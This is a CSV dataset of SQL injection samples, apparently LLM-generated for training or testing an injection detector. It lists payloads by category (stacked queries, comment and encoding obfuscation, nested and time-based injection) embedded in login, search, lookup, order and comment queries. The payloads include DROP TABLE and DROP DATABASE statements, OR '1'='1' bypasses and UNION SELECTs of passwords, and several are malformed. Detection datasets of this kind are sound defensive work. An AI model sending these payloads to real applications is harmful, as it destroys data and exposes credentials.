attack_category,template_context,payload,full_query,label,source,generator_model
blind_time,comment_insert,"/*
TIME_WAIT('5')
*/;WAITFOR DELAY '00:00:05'--","INSERT INTO comments (user_id, body) VALUES (1, '/*
TIME_WAIT('5')
*/;WAITFOR DELAY '00:00:05'--')",1,llm_generated,gemini-3-flash-preview
stacked_queries,login,; DROP TABLE IF EXISTS users; --,SELECT * FROM users WHERE username = '; DROP TABLE IF EXISTS users; --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
stacked_queries,login,"'; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --","SELECT * FROM users WHERE username = ''; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
stacked_queries,login,"--; INSERT INTO users (username, password) VALUES ('admin', 'admin');","SELECT * FROM users WHERE username = '--; INSERT INTO users (username, password) VALUES ('admin', 'admin');' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
stacked_queries,search,; DROP TABLE users; --,SELECT * FROM products WHERE name LIKE '%; DROP TABLE users; --%',1,llm_generated,gemini-3-flash-preview
stacked_queries,search,; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //,SELECT * FROM products WHERE name LIKE '%; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //%',1,llm_generated,gemini-3-flash-preview
stacked_queries,search,'; DROP DATABASE database_name;--,SELECT * FROM products WHERE name LIKE '%'; DROP DATABASE database_name;--%',1,llm_generated,gemini-3-flash-preview
stacked_queries,user_lookup,; DROP TABLE users;,SELECT * FROM users WHERE id = ; DROP TABLE users;,1,llm_generated,gemini-3-flash-preview
stacked_queries,user_lookup,"--
SELECT id FROM users --","SELECT * FROM users WHERE id = --
SELECT id FROM users --",1,llm_generated,gemini-3-flash-preview
stacked_queries,user_lookup,/*malicious*/ ; DELETE FROM users;,SELECT * FROM users WHERE id = /*malicious*/ ; DELETE FROM users;,1,llm_generated,gemini-3-flash-preview
stacked_queries,order_filter,; DROP TABLE users --,SELECT * FROM orders WHERE status = '; DROP TABLE users --' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
stacked_queries,order_filter,"; DELETE FROM orders;
--","SELECT * FROM orders WHERE status = '; DELETE FROM orders;
--' ORDER BY date DESC",1,llm_generated,gemini-3-flash-preview
stacked_queries,order_filter,--'; INSERT INTO logs VALUES ('hack');--,SELECT * FROM orders WHERE status = '--'; INSERT INTO logs VALUES ('hack');--' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
stacked_queries,comment_insert,SELECT * FROM users; DROP TABLE comments; --,"INSERT INTO comments (user_id, body) VALUES (1, 'SELECT * FROM users; DROP TABLE comments; --')",1,llm_generated,gemini-3-flash-preview
stacked_queries,comment_insert,--'; DELETE FROM sessions; --,"INSERT INTO comments (user_id, body) VALUES (1, '--'; DELETE FROM sessions; --')",1,llm_generated,gemini-3-flash-preview
stacked_queries,comment_insert,"/* SQL Injection */; SELECT username, password FROM admin","INSERT INTO comments (user_id, body) VALUES (1, '/* SQL Injection */; SELECT username, password FROM admin')",1,llm_generated,gemini-3-flash-preview
comment_obfuscation,login,SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
comment_obfuscation,login,SELECT * FROM users WHERE username = 'admin' #AND password = 'admin',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' #AND password = 'admin'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
comment_obfuscation,login,SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';,SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
comment_obfuscation,search,/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94',SELECT * FROM products WHERE name LIKE '%/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94'%',1,llm_generated,gemini-3-flash-preview
comment_obfuscation,search,--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%',SELECT * FROM products WHERE name LIKE '%--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%'%',1,llm_generated,gemini-3-flash-preview
comment_obfuscation,search,#SELECT * FROM products WHERE name LIKE '/*%',SELECT * FROM products WHERE name LIKE '%#SELECT * FROM products WHERE name LIKE '/*%'%',1,llm_generated,gemini-3-flash-preview
comment_obfuscation,user_lookup,--' OR '1'='1,SELECT * FROM users WHERE id = --' OR '1'='1,1,llm_generated,gemini-3-flash-preview
comment_obfuscation,user_lookup,/**/1=1,SELECT * FROM users WHERE id = /**/1=1,1,llm_generated,gemini-3-flash-preview
comment_obfuscation,order_filter,SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
comment_obfuscation,order_filter,SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
comment_obfuscation,order_filter,SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC,SELECT * FROM orders WHERE status = 'SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
comment_obfuscation,comment_insert,--' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '--' OR '1'='1')",1,llm_generated,gemini-3-flash-preview
comment_obfuscation,comment_insert,#' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '#' OR '1'='1')",1,llm_generated,gemini-3-flash-preview
comment_obfuscation,comment_insert,/**/' OR '1'='1,"INSERT INTO comments (user_id, body) VALUES (1, '/**/' OR '1'='1')",1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,login,%27+OR+1=1;--,SELECT * FROM users WHERE username = '%27+OR+1=1;--' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,login,%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;),SELECT * FROM users WHERE username = '%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;)' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,login,"UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1","SELECT * FROM users WHERE username = 'UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,search,%25' OR '1'='1,SELECT * FROM products WHERE name LIKE '%%25' OR '1'='1%',1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,search,"' OR ASCII(SUBSTRING(username,1,1))=116 --","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING(username,1,1))=116 --%'",1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,user_lookup,%23SELECT+*+FROM+users+WHERE+id+%3D+'admin',SELECT * FROM users WHERE id = %23SELECT+*+FROM+users+WHERE+id+%3D+'admin',1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,user_lookup,SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),SELECT * FROM users WHERE id = SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,user_lookup,/*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',SELECT * FROM users WHERE id = /*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,order_filter,%27--,SELECT * FROM orders WHERE status = '%27--' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,order_filter,%60;/**/,SELECT * FROM orders WHERE status = '%60;/**/' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,order_filter,CHAR(39)%0A,SELECT * FROM orders WHERE status = 'CHAR(39)%0A' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,comment_insert,"%27+UNION+SELECT+NULL,+body+FROM+users--","INSERT INTO comments (user_id, body) VALUES (1, '%27+UNION+SELECT+NULL,+body+FROM+users--')",1,llm_generated,gemini-3-flash-preview
encoding_obfuscation,comment_insert,"CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*","INSERT INTO comments (user_id, body) VALUES (1, 'CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*')",1,llm_generated,gemini-3-flash-preview
nested_injection,login,SELECT * FROM users WHERE username = '' OR '1'='1',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = '' OR '1'='1'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
nested_injection,login,SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'' AND password = 'anything',1,llm_generated,gemini-3-flash-preview
nested_injection,login,"SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))","SELECT * FROM users WHERE username = 'SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview
nested_injection,search,;select * from users where username like '%' --,SELECT * FROM products WHERE name LIKE '%;select * from users where username like '%' --%',1,llm_generated,gemini-3-flash-preview
nested_injection,search,' OR EXISTS(SELECT 1 FROM orders),SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM orders)%',1,llm_generated,gemini-3-flash-preview
nested_injection,search,'; DROP TABLE IF EXISTS backups;--,SELECT * FROM products WHERE name LIKE '%'; DROP TABLE IF EXISTS backups;--%',1,llm_generated,gemini-3-flash-preview
nested_injection,user_lookup,(SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),SELECT * FROM users WHERE id = (SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),1,llm_generated,gemini-3-flash-preview
nested_injection,user_lookup,1 AND (SELECT COUNT(*) FROM users WHERE id=2),SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE id=2),1,llm_generated,gemini-3-flash-preview
nested_injection,user_lookup,-- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),SELECT * FROM users WHERE id = -- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),1,llm_generated,gemini-3-flash-preview
nested_injection,order_filter,(SELECT status FROM users WHERE username = 'admin' AND password = 'password'),SELECT * FROM orders WHERE status = '(SELECT status FROM users WHERE username = 'admin' AND password = 'password')' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
nested_injection,order_filter,/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */),SELECT * FROM orders WHERE status = '/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */)' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
nested_injection,order_filter,OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp),SELECT * FROM orders WHERE status = 'OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp)' ORDER BY date DESC,1,llm_generated,gemini-3-flash-preview
nested_injection,comment_insert,(SELECT body FROM comments WHERE user_id=1)--,"INSERT INTO comments (user_id, body) VALUES (1, '(SELECT body FROM comments WHERE user_id=1)--')",1,llm_generated,gemini-3-flash-preview
nested_injection,comment_insert,--(SELECT body FROM comments WHERE user_id=1) --,"INSERT INTO comments (user_id, body) VALUES (1, '--(SELECT body FROM comments WHERE user_id=1) --')",1,llm_generated,gemini-3-flash-preview
nested_injection,comment_insert,;--(SELECT body FROM comments WHERE user_id=1);--,"INSERT INTO comments (user_id, body) VALUES (1, ';--(SELECT body FROM comments WHERE user_id=1);--')",1,llm_generated,gemini-3-flash-preview
